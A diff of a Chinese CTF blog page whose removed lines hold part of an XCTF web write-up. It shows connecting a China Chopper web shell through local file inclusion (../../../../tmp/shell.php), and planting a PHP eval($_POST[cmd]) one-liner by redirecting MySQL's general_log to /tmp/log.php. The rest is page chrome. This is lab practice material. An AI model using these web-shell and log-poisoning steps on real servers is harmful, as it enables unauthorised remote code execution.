-<p>发现成功写入</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/4.png" alt="4"></p>
-</li>
-<li><p>打开菜刀, 连接尝试</p>
-<p>地址: <code>http://111.198.29.45:48772/index.php?page=../../../../tmp/shell.php</code></p>
-<p>连接密码: <code>cmd</code></p>
-</li>
-<li><p>成功发现flag</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/5.png" alt="5"></p>
-</li>
-</ul>
-<h5 id="2-日志拿-shell"><a href="#2-日志拿-shell" class="headerlink" title="2. 日志拿 shell"></a>2. 日志拿 shell</h5><ul>
-<li><p>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&apos;on&apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>general log file 指的是日志的保存路径</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&apos;/tmp/log.php&apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>利用日志的记录插入一句话</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>菜刀连接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:37211/index.php?page=../../../../tmp/log.php</span><br></pre></td></tr></table></figure>
-
 </li>
 </ul>
 
@@ -406,7 +369,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http:/2019/11/27/XCTF-Web进阶(二)/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http:/2020/02/12/AI-WEB-1.0——Workthrough/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -421,8 +384,8 @@
 <nav id="article-nav">
   
   
-    <a href="/2019/11/23/校内安洵CTF/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">校内安洵CTF</div>
+    <a href="/2019/12/04/XCTF-Web进阶(二)/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">XCTF-Web进阶(二)</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -465,7 +428,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2019 Lorewalker
+    		&copy; 2020 Lorewalker
     	</div>
       	<div class="footer-right">
       		<a>既然你读到了最后</a>
@@ -554,19 +517,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">大数据</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Web网站</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
+                <a href="javascript:void(0)" class="js-tag color2">计算机小技巧</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">计算机小技巧</a>
+                <a href="javascript:void(0)" class="js-tag color4">大数据</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
               </li>
              
               <li class="article-tag-list-item">
